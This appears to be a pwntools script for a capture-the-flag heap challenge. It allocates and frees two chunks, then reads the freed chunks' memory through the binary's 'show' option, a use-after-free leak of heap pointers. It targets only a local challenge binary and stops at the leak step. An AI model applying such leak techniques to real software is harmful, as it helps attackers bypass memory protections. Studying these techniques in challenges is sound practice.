from pwn import *
context.log_level='error'
io=process('./chal_patched')
def add(i,s):
    io.sendlineafter(b'> ',b'1'); io.sendlineafter(b'Index: ',str(i).encode()); io.sendlineafter(b'Size: ',str(s).encode())
def free(i):
    io.sendlineafter(b'> ',b'2'); io.sendlineafter(b'Index: ',str(i).encode())
def show_raw(i,off,ln):
    io.sendlineafter(b'> ',b'4'); io.sendlineafter(b'Index: ',str(i).encode()); io.sendlineafter(b'Offset: ',str(off).encode()); io.sendlineafter(b'Length: ',str(ln).encode())
    return io.recvuntil(b'1) malloc')
add(0,0x30); add(1,0x30); free(0); free(1)
print("SHOW(0,0,8) raw:", show_raw(0,0,8))
print("SHOW(1,0,8) raw:", show_raw(1,0,8))
print("SHOW(1,8,8) raw:", show_raw(1,8,8))
io.close()
